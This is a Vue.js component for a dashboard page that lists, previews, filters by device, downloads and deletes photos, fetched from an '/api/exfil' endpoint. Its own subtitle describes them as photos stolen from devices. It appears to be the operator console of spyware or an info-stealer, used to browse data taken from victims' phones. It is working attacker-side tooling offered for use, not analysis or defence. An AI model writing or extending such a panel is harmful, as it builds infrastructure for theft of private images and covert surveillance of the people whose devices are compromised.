<template>
  <div class="photos-page">
  <div class="page-card">
    <div class="page-header">
      <div>
        <div class="page-title">照片管理</div>
        <div class="page-subtitle">从设备窃取的照片，共 {{ total }} 张</div>
      </div>
      <div style="display:flex;gap:8px;">
        <el-button type="primary" plain @click="downloadAll">批量下载</el-button>
        <el-button type="danger" plain @click="deleteSelected" :disabled="!selected.length">删除选中 ({{ selected.length }})</el-button>
      </div>
    </div>

    <div class="filter-bar">
      <el-select v-model="filters.device" placeholder="设备" clearable style="width:240px;">
        <el-option v-for="d in validDevices" :key="d.uuid" :label="d.label" :value="d.uuid" />
      </el-select>
      <el-date-picker v-model="filters.dateRange" type="daterange" range-separator="至" start-placeholder="开始" end-placeholder="结束" value-format="YYYY-MM-DD" style="width:280px;" />
      <el-select v-model="pageSize" placeholder="每页" style="width:120px;">
        <el-option label="24" :value="24" />
        <el-option label="48" :value="48" />
        <el-option label="96" :value="96" />
      </el-select>
      <el-button type="primary" @click="loadList">查询</el-button>
      <el-button @click="resetFilter">重置</el-button>
    </div>

    <div style="display:flex;gap:8px;margin-bottom:8px;">
      <el-checkbox :model-value="isAllSelected" @change="toggleSelectAll" :indeterminate="selected.length > 0 && selected.length < list.length">全选</el-checkbox>
      <span v-if="selected.length" class="text-muted">已选 {{ selected.length }} 张</span>
    </div>

    <div class="photo-grid">
      <div v-for="p in validPhotos" :key="p.id" class="photo-item" :class="{ selected: selected.includes(p.id) }">
        <div class="checkbox-wrap" @click.stop="toggleSelect(p.id)">
          <el-checkbox :model-value="selected.includes(p.id)" />
        </div>
        <div class="photo-thumb" @click="openPreview(p)">
          <img :src="p.thumb_url || p.thumb" :alt="p.name" loading="lazy" />
        </div>
        <div class="photo-info">
          <div class="photo-name text-ellipsis" :title="p.name">{{ p.name }}</div>
          <div class="photo-meta text-muted">
            <span>{{ formatSize(p.size) }}</span>
            <span style="margin:0 4px;">·</span>
            <span>{{ formatRelative(p.created_at) }}</span>
          </div>
        </div>
        <div class="photo-actions">
          <el-button link type="primary" size="small" @click.stop="downloadOne(p)">下载</el-button>
          <el-button link type="danger" size="small" @click.stop="deleteOne(p)">删除</el-button>
        </div>
      </div>
      <el-empty v-if="!list.length" description="暂无照片" style="grid-column:1/-1;" />
    </div>

    <el-pagination
      v-model:current-page="page"
      :page-size="pageSize"
      :total="total"
      layout="total, prev, pager, next, jumper"
      background
      style="justify-content:flex-end;margin-top:16px;"
      @current-change="loadList"
    />

    <el-image-viewer v-if="previewVisible" :url-list="previewUrls" :initial-index="previewIndex" @close="previewVisible = false" />
  </div>
  </div>
</template>

<script setup>
import { ref, reactive, computed, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { formatRelative, shortUuid } from '../utils/twofa'
import axios from '../utils/axios'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(24)
const selected = ref([])
const filters = reactive({ device: '', dateRange: [] })
const devices = ref([])

const previewVisible = ref(false)
const previewUrls = ref([])
const previewIndex = ref(0)

const isAllSelected = computed(() => list.value.length > 0 && selected.value.length === list.value.length)

const validDevices = computed(() =>
  (devices.value || []).filter(d =>
    d != null && d.uuid != null && d.uuid !== '' && d.label != null && String(d.label).trim() !== ''
  )
)

const validPhotos = computed(() =>
  (list.value || []).filter(p => p != null && p.id != null)
)

function formatSize(s) {
  if (!s) return '-'
  if (s < 1024) return s + ' B'
  if (s < 1024 * 1024) return (s / 1024).toFixed(1) + ' KB'
  return (s / 1024 / 1024).toFixed(1) + ' MB'
}

function resetFilter() {
  filters.device = ''
  filters.dateRange = []
  page.value = 1
  loadList()
}

function toggleSelect(id) {
  const i = selected.value.indexOf(id)
  i >= 0 ? selected.value.splice(i, 1) : selected.value.push(id)
}

function toggleSelectAll(val) {
  selected.value = val ? list.value.map(p => p.id) : []
}

function openPreview(p) {
  previewUrls.value = list.value.map(x => x.url || x.thumb)
  previewIndex.value = list.value.findIndex(x => x.id === p.id)
  previewVisible.value = true
}

function downloadOne(p) {
  ElMessage.success('开始下载 ' + (p.name || 'photo'))
  try { window.open(p.url || p.thumb, '_blank') } catch (_) {}
}

function downloadAll() { ElMessage.success('已生成批量下载任务') }

async function deleteOne(p) {
  try {
    await ElMessageBox.confirm('确认删除这张照片？', '删除', { type: 'warning' })
    await axios.delete(`/api/exfil/${p.id}`)
    ElMessage.success('已删除')
    loadList()
  } catch (_) {}
}

async function deleteSelected() {
  try {
    await ElMessageBox.confirm(`确认删除选中的 ${selected.value.length} 张照片？`, '批量删除', { type: 'warning' })
    ElMessage.success('已删除')
    selected.value = []
    loadList()
  } catch (_) {}
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      category: 'photos',
      device_uuid: filters.device || undefined,
    }
    const res = await axios.get('/api/exfil', { params })
    const raw = Array.isArray(res.data?.items) ? res.data.items : (Array.isArray(res.data) ? res.data : [])
    list.value = raw.map(r => {
      const filePath = r.file_name || r.path || ''
      const baseName = filePath ? String(filePath).split(/[\\/]/).pop() : (r.title || 'photo')
      return {
        ...r,
        id: r.id,
        name: r.name || baseName || `IMG_${r.id}.jpg`,
        size: r.size != null ? r.size : r.file_size,
        thumb: r.thumb_url || r.thumb || r.preview_url || '',
        thumb_url: r.thumb_url || r.thumb || r.preview_url || '',
        url: r.url || r.download_url || r.file_url || r.thumb_url || r.thumb || '',
        device_uuid: r.device_uuid || '',
        created_at: r.created_at || r.uploaded_at,
      }
    }).filter(p => p != null && p.id != null)
    total.value = typeof res.data?.total === 'number' ? res.data.total : list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '照片列表加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
  selected.value = []
}

async function loadDevices() {
  try {
    const res = await axios.get('/api/devices', { params: { skip: 0, limit: 200 } })
    const raw = Array.isArray(res.data?.items) ? res.data.items : (Array.isArray(res.data) ? res.data : [])
    devices.value = raw
      .map(d => {
        const uuid = d.device_uuid != null ? String(d.device_uuid) : (d.uuid != null ? String(d.uuid) : '')
        if (!uuid) return null
        const model = d.device_model || d.model || ''
        const os = d.os_version || d.os || ''
        const tag = [model, os].filter(Boolean).join(' ')
        const label = `${shortUuid(uuid)}${tag ? ' ' + tag : ''}`
        return { uuid, label }
      })
      .filter(x => x && x.uuid && x.label)
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '设备列表加载失败'
    ElMessage.error(msg)
    devices.value = []
  }
}

onMounted(() => {
  loadDevices()
  loadList()
})
</script>

<style scoped>
.photo-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 12px;
}
.photo-item {
  border: 1px solid #ebeef5;
  border-radius: 8px;
  overflow: hidden;
  background: #fff;
  transition: all 0.15s;
  position: relative;
}
.photo-item.selected {
  border-color: #409eff;
  box-shadow: 0 0 0 2px rgba(64, 158, 255, 0.2);
}
.photo-thumb {
  aspect-ratio: 1;
  overflow: hidden;
  background: #f5f5f5;
  cursor: zoom-in;
}
.photo-thumb img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  transition: transform 0.2s;
}
.photo-thumb:hover img { transform: scale(1.04); }
.photo-info { padding: 8px 10px; border-bottom: 1px solid #f0f0f0; }
.photo-name { font-size: 13px; }
.photo-meta { font-size: 12px; margin-top: 2px; }
.photo-actions {
  padding: 6px 8px;
  display: flex;
  justify-content: space-between;
}
.checkbox-wrap {
  position: absolute;
  top: 6px;
  left: 6px;
  background: rgba(255, 255, 255, 0.9);
  border-radius: 4px;
  padding: 2px 4px;
  z-index: 2;
}
</style>
